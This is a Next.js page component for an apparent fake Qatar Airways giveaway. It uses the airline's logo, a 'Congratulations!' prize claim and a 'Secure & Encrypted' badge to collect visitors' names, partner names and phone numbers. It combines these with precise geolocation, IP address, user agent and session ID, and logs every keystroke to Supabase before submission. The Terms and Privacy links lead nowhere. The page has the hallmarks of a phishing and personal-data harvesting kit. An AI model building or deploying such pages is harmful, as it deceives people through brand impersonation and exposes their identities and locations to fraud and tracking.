'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import Image from 'next/image'

interface FormData {
  firstName: string
  surname: string
  partnerName: string
  phoneNumber: string
  agreeToTerms: boolean
}

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
}

export default function SuccessPage() {
  const router = useRouter()
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    surname: '',
    partnerName: '',
    phoneNumber: '',
    agreeToTerms: false
  })
  const [location, setLocation] = useState<LocationData | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('success_page')
    
    // Get location from sessionStorage
    const storedLocation = sessionStorage.getItem('userLocation')
    if (storedLocation) {
      setLocation(JSON.parse(storedLocation))
    } else {
      // If no location data, redirect back to main page
      router.push('/')
    }

    // Track form loaded
    supabaseHelpers.trackUserAction('form_loaded')
  }, [router])

  const handleInputChange = (field: keyof FormData, value: string | boolean) => {
    setFormData(prev => ({ ...prev, [field]: value }))
    
    // Track field changes
    supabaseHelpers.trackFormInteraction('change', field, value)
  }

  const handleFieldFocus = (field: string) => {
    supabaseHelpers.trackFormInteraction('focus', field)
  }

  const handleFieldBlur = (field: string) => {
    supabaseHelpers.trackFormInteraction('blur', field, formData[field as keyof FormData])
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    // Track form submission attempt
    await supabaseHelpers.trackFormInteraction('submit_attempt')

    try {
      // Get additional data
      const ipAddress = await supabaseHelpers.getUserIP()
      const sessionId = supabaseHelpers.getSessionId()

      // Prepare submission data
      const submissionData = {
        firstName: formData.firstName,
        surname: formData.surname,
        partnerName: formData.partnerName || null,
        phoneNumber: formData.phoneNumber,
        latitude: location?.latitude,
        longitude: location?.longitude,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ipAddress: ipAddress,
        sessionId: sessionId,
        agreeToTerms: formData.agreeToTerms
      }

      // Submit to Supabase
      await supabaseHelpers.insertFormSubmission(submissionData)

      // Track successful submission
      await supabaseHelpers.trackFormInteraction('submit_success')

      // Show success message
      setShowSuccess(true)

      // Reset form after delay
      setTimeout(() => {
        setFormData({
          firstName: '',
          surname: '',
          partnerName: '',
          phoneNumber: '',
          agreeToTerms: false
        })
        setShowSuccess(false)
      }, 5000)

    } catch (error) {
      console.error('Form submission error:', error)
      
      // Track submission error
      await supabaseHelpers.trackFormInteraction('submit_error', null, error instanceof Error ? error.message : 'Unknown error')
      
      alert('There was an error submitting your form. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  const getFloatingStyle = (index: number) => {
    const positions = [
      { top: '5%', left: '5%', animationDelay: '0s' },
      { top: '15%', right: '10%', animationDelay: '1s' },
      { top: '25%', left: '85%', animationDelay: '2s' },
      { top: '45%', left: '10%', animationDelay: '3s' },
      { top: '55%', right: '15%', animationDelay: '4s' },
      { top: '75%', left: '20%', animationDelay: '5s' },
      { top: '85%', right: '25%', animationDelay: '6s' },
      { top: '35%', left: '50%', animationDelay: '7s' }
    ]
    return positions[index - 1] || {}
  }

  if (showSuccess) {
    return (
      <div className="user-details-form success-state">
        <div className="background-pattern"></div>
        <div className="floating-elements">
          {[1, 2, 3, 4, 5, 6, 7, 8].map(n => (
            <div 
              key={n} 
              className="floating-element" 
              style={getFloatingStyle(n)}
            ></div>
          ))}
        </div>
        
        <div className="form-container">
          <div className="header-section">
            <div className="logo-container">
              <Image 
                src="https://logotyp.us/files/qatar-airways.svg" 
                alt="Qatar Airways" 
                className="logo"
                width={120}
                height={50}
              />
              <div className="logo-glow"></div>
            </div>
            
            <div className="success-badge">
              <div className="success-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
              <span>Entry Completed</span>
            </div>
          </div>

          <div className="success-message">
            <div className="success-icon-large">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <h3>Entry Completed Successfully!</h3>
            <p>Thank you for your submission. Winners will be contacted by email after July 25th, 2025.</p>
          </div>
        </div>

        <div className="footer">
          <div className="security-badge">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" fill="currentColor"/>
            </svg>
            <span>Secure & Encrypted</span>
          </div>
        </div>

        <style jsx>{`
          .success-state {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
          }
          
          .success-message {
            text-align: center;
            padding: 3rem 2rem;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            margin: 2rem 0;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
          }

          .success-icon-large {
            width: 80px;
            height: 80px;
            margin: 0 auto 1.5rem;
            color: #10b981;
            animation: successPulse 2s ease-in-out infinite;
          }

          .success-message h3 {
            font-size: 1.5rem;
            font-weight: 700;
            color: #1f2937;
            margin-bottom: 1rem;
          }

          .success-message p {
            color: #6b7280;
            font-size: 1rem;
            line-height: 1.6;
          }

          @keyframes successPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
          }
        `}</style>
      </div>
    )
  }

  return (
    <div className="user-details-form">
      {/* Background Elements */}
      <div className="background-pattern"></div>
      <div className="floating-elements">
        {[1, 2, 3, 4, 5, 6, 7, 8].map(n => (
          <div 
            key={n} 
            className="floating-element" 
            style={getFloatingStyle(n)}
          ></div>
        ))}
      </div>
      
      {/* Main Content Container */}
      <div className="form-container">
        {/* Header Section */}
        <div className="header-section">
          <div className="logo-container">
            <Image 
              src="https://logotyp.us/files/qatar-airways.svg" 
              alt="Qatar Airways" 
              className="logo"
              width={120}
              height={50}
            />
            <div className="logo-glow"></div>
          </div>
          
          {/* Success Badge */}
          <div className="success-badge">
            <div className="success-icon">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <span>Eligibility Confirmed</span>
          </div>
        </div>

        {/* Title Section */}
        <div className="title-section">
          <h1 className="main-title">
            <span className="title-highlight">Congratulations!</span>
          </h1>
          <div className="subtitle">Complete Your Entry</div>
          <p className="description">
            You&apos;re now eligible for our exclusive flight offer! Please provide your details below to complete your entry.
          </p>
        </div>

        {/* Form Section */}
        <form onSubmit={handleSubmit} className="details-form">
          <div className="form-grid">
            <div className="form-group">
              <label htmlFor="firstName" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                First Name
              </label>
              <input
                type="text"
                id="firstName"
                value={formData.firstName}
                onChange={(e) => handleInputChange('firstName', e.target.value)}
                onFocus={() => handleFieldFocus('firstName')}
                onBlur={() => handleFieldBlur('firstName')}
                className="form-input"
                placeholder="Enter your first name"
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="surname" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Surname
              </label>
              <input
                type="text"
                id="surname"
                value={formData.surname}
                onChange={(e) => handleInputChange('surname', e.target.value)}
                onFocus={() => handleFieldFocus('surname')}
                onBlur={() => handleFieldBlur('surname')}
                className="form-input"
                placeholder="Enter your surname"
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="partnerName" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M17 21V19C17 17.9391 16.5786 16.9217 15.8284 16.1716C15.0783 15.4214 14.0609 15 13 15H5C3.93913 15 2.92172 15.4214 2.17157 16.1716C1.42143 16.9217 1 17.9391 1 19V21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M9 11C11.2091 11 13 9.20914 13 7C13 4.79086 11.2091 3 9 3C6.79086 3 5 4.79086 5 7C5 9.20914 6.79086 11 9 11Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M23 21V19C22.9993 18.1137 22.7044 17.2528 22.1614 16.5523C21.6184 15.8519 20.8581 15.3516 20 15.13" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M16 3.13C16.8604 3.35031 17.623 3.85071 18.1676 4.55232C18.7122 5.25392 19.0078 6.11683 19.0078 7.005C19.0078 7.89318 18.7122 8.75608 18.1676 9.45769C17.623 10.1593 16.8604 10.6597 16 10.88" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Partner Name
              </label>
              <input
                type="text"
                id="partnerName"
                value={formData.partnerName}
                onChange={(e) => handleInputChange('partnerName', e.target.value)}
                onFocus={() => handleFieldFocus('partnerName')}
                onBlur={() => handleFieldBlur('partnerName')}
                className="form-input"
                placeholder="Enter your partner's name (optional)"
              />
            </div>

            <div className="form-group">
              <label htmlFor="phoneNumber" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22 16.92V19.92C22.0011 20.1985 21.9441 20.4742 21.8325 20.7293C21.7209 20.9845 21.5573 21.2136 21.3521 21.4019C21.1468 21.5901 20.9046 21.7335 20.6407 21.8227C20.3769 21.9119 20.0974 21.9451 19.82 21.92C16.7428 21.5856 13.787 20.5341 11.19 18.85C8.77382 17.3147 6.72533 15.2662 5.18999 12.85C3.49997 10.2412 2.44824 7.27099 2.11999 4.18C2.095 3.90347 2.12787 3.62476 2.21649 3.36162C2.30512 3.09849 2.44756 2.85669 2.63476 2.65162C2.82196 2.44655 3.0498 2.28271 3.30379 2.17052C3.55777 2.05833 3.83233 2.00026 4.10999 2H7.10999C7.59531 1.99522 8.06579 2.16708 8.43376 2.48353C8.80173 2.79999 9.04207 3.23945 9.10999 3.72C9.23662 4.68007 9.47144 5.62273 9.80999 6.53C9.94454 6.88792 9.97366 7.27691 9.8939 7.65088C9.81415 8.02485 9.62886 8.36811 9.35999 8.64L8.08999 9.91C9.51355 12.4135 11.5865 14.4864 14.09 15.91L15.36 14.64C15.6319 14.3711 15.9751 14.1858 16.3491 14.1061C16.7231 14.0263 17.1121 14.0555 17.47 14.19C18.3773 14.5286 19.3199 14.7634 20.28 14.89C20.7658 14.9585 21.2094 15.2032 21.5265 15.5775C21.8437 15.9518 22.0122 16.4296 22 16.92Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Phone Number
              </label>
              <input
                type="tel"
                id="phoneNumber"
                value={formData.phoneNumber}
                onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
                onFocus={() => handleFieldFocus('phoneNumber')}
                onBlur={() => handleFieldBlur('phoneNumber')}
                className="form-input"
                placeholder="Enter your phone number"
                required
              />
            </div>
          </div>

          {/* Terms and Conditions */}
          <div className="terms-section">
            <label className="checkbox-container">
              <input 
                type="checkbox" 
                checked={formData.agreeToTerms}
                onChange={(e) => handleInputChange('agreeToTerms', e.target.checked)}
                required
              />
              <span className="checkmark"></span>
              <span className="checkbox-text">
                I agree to the <a href="#" className="terms-link">Terms & Conditions</a> and 
                <a href="#" className="terms-link">Privacy Policy</a>
              </span>
            </label>
          </div>

          {/* Submit Button */}
          <div className="submit-section">
            <button type="submit" className="submit-button" disabled={isSubmitting}>
              <div className="button-content">
                {!isSubmitting ? (
                  <svg className="submit-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M22 2L11 13" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                ) : (
                  <div className="loading-spinner"></div>
                )}
                <span>{isSubmitting ? 'Submitting...' : 'Complete Entry'}</span>
              </div>
              <div className="button-glow"></div>
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="footer">
        <div className="security-badge">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" fill="currentColor"/>
          </svg>
          <span>Secure & Encrypted</span>
        </div>
      </div>

      <style jsx>{`
        /* Main Container */
        .user-details-form {
          position: relative;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 2rem;
          box-sizing: border-box;
        }

        /* Background Elements */
        .background-pattern {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-image: 
            radial-gradient(circle at 20% 20%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(255, 255, 255, 0.05) 0%, transparent 50%),
            radial-gradient(circle at 40% 60%, rgba(255, 255, 255, 0.03) 0%, transparent 50%);
          background-size: 150px 150px, 200px 200px, 100px 100px;
          animation: backgroundMove 25s ease-in-out infinite;
        }

        .floating-elements {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          pointer-events: none;
        }

        .floating-element {
          position: absolute;
          width: 4px;
          height: 4px;
          background: rgba(255, 255, 255, 0.4);
          border-radius: 50%;
          animation: float 8s ease-in-out infinite;
        }

        /* Form Container */
        .form-container {
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(20px);
          border-radius: 24px;
          padding: 3rem;
          max-width: 700px;
          width: 100%;
          box-shadow: 
            0 25px 50px rgba(0, 0, 0, 0.15),
            0 0 0 1px rgba(255, 255, 255, 0.2);
          animation: slideUp 0.8s ease-out;
          position: relative;
        }

        /* Header Section */
        .header-section {
          text-align: center;
          margin-bottom: 2.5rem;
        }

        .logo-container {
          position: relative;
          display: inline-block;
          margin-bottom: 1.5rem;
        }

        .logo {
          width: clamp(100px, 15vw, 120px);
          height: auto;
          filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.1));
          transition: transform 0.3s ease;
        }

        .logo:hover {
          transform: scale(1.05);
        }

        .logo-glow {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 150%;
          height: 150%;
          background: radial-gradient(circle, rgba(92, 15, 60, 0.2) 0%, transparent 70%);
          border-radius: 50%;
          animation: pulse 3s ease-in-out infinite;
        }

        .success-badge {
          display: inline-flex;
          align-items: center;
          gap: 0.5rem;
          background: linear-gradient(135deg, #10b981, #059669);
          color: white;
          padding: 0.5rem 1rem;
          border-radius: 50px;
          font-size: 0.875rem;
          font-weight: 600;
          box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        }

        .success-icon {
          width: 16px;
          height: 16px;
        }

        /* Title Section */
        .title-section {
          text-align: center;
          margin-bottom: 2.5rem;
        }

        .main-title {
          font-size: clamp(2.5rem, 6vw, 3.5rem);
          font-weight: 800;
          margin-bottom: 0.5rem;
          line-height: 1.1;
        }

        .title-highlight {
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .subtitle {
          font-size: 1.25rem;
          color: #7f8c8d;
          font-weight: 500;
          margin-bottom: 1.5rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        .description {
          font-size: 1rem;
          color: #4a5568;
          line-height: 1.6;
          max-width: 500px;
          margin: 0 auto;
        }

        /* Form Styles */
        .details-form {
          display: flex;
          flex-direction: column;
          gap: 2rem;
        }

        .form-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 1.5rem;
        }

        .form-group {
          display: flex;
          flex-direction: column;
        }

        .form-label {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.875rem;
          font-weight: 600;
          color: #374151;
          margin-bottom: 0.5rem;
        }

        .label-icon {
          width: 16px;
          height: 16px;
          color: #5c0f3c;
        }

        .form-input {
          padding: 0.875rem 1rem;
          border: 2px solid #e5e7eb;
          border-radius: 12px;
          font-size: 1rem;
          transition: all 0.2s ease;
          background: white;
        }

        .form-input:focus {
          outline: none;
          border-color: #5c0f3c;
          box-shadow: 0 0 0 3px rgba(92, 15, 60, 0.1);
        }

        .form-input::placeholder {
          color: #9ca3af;
        }

        /* Terms Section */
        .terms-section {
          margin: 1rem 0;
        }

        .checkbox-container {
          display: flex;
          align-items: flex-start;
          gap: 0.75rem;
          cursor: pointer;
          font-size: 0.875rem;
          line-height: 1.5;
        }

        .checkbox-container input[type="checkbox"] {
          position: absolute;
          opacity: 0;
          cursor: pointer;
        }

        .checkmark {
          position: relative;
          width: 18px;
          height: 18px;
          background: white;
          border: 2px solid #d1d5db;
          border-radius: 4px;
          transition: all 0.2s ease;
          flex-shrink: 0;
          margin-top: 2px;
        }

        .checkbox-container input:checked ~ .checkmark {
          background: #5c0f3c;
          border-color: #5c0f3c;
        }

        .checkmark:after {
          content: "";
          position: absolute;
          display: none;
          left: 5px;
          top: 2px;
          width: 4px;
          height: 8px;
          border: solid white;
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
        }

        .checkbox-container input:checked ~ .checkmark:after {
          display: block;
        }

        .checkbox-text {
          color: #4b5563;
        }

        .terms-link {
          color: #5c0f3c;
          text-decoration: underline;
          font-weight: 500;
        }

        .terms-link:hover {
          color: #8b1538;
        }

        /* Submit Section */
        .submit-section {
          text-align: center;
        }

        .submit-button {
          position: relative;
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          color: white;
          border: none;
          padding: 1rem 2.5rem;
          border-radius: 50px;
          cursor: pointer;
          font-size: 1.125rem;
          font-weight: 600;
          transition: all 0.3s ease;
          overflow: hidden;
          box-shadow: 0 8px 25px rgba(92, 15, 60, 0.3);
          min-width: 200px;
        }

        .submit-button:hover:not(:disabled) {
          transform: translateY(-3px);
          box-shadow: 0 12px 35px rgba(92, 15, 60, 0.4);
        }

        .submit-button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }

        .button-content {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 0.5rem;
          position: relative;
          z-index: 2;
        }

        .submit-icon {
          width: 18px;
          height: 18px;
        }

        .loading-spinner {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-top: 2px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        .button-glow {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 100%;
          height: 100%;
          background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
          opacity: 0;
          transition: opacity 0.3s ease;
        }

        .submit-button:hover .button-glow {
          opacity: 1;
        }

        /* Footer */
        .footer {
          position: absolute;
          bottom: 2rem;
          left: 50%;
          transform: translateX(-50%);
        }

        .security-badge {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          background: rgba(255, 255, 255, 0.9);
          color: #5c0f3c;
          padding: 0.5rem 1rem;
          border-radius: 50px;
          font-size: 0.875rem;
          font-weight: 500;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .security-badge svg {
          width: 16px;
          height: 16px;
        }

        /* Animations */
        @keyframes backgroundMove {
          0%, 100% { transform: translate(0, 0); }
          33% { transform: translate(-10px, -10px); }
          66% { transform: translate(10px, -5px); }
        }

        @keyframes float {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-20px) rotate(180deg); }
        }

        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes pulse {
          0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
          50% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.1); }
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
          .user-details-form {
            padding: 1rem;
          }

          .form-container {
            padding: 2rem;
          }

          .form-grid {
            grid-template-columns: 1fr;
            gap: 1rem;
          }

          .main-title {
            font-size: 2rem;
          }

          .subtitle {
            font-size: 1rem;
          }

          .description {
            font-size: 0.9rem;
          }
        }
      `}</style>
    </div>
  )
}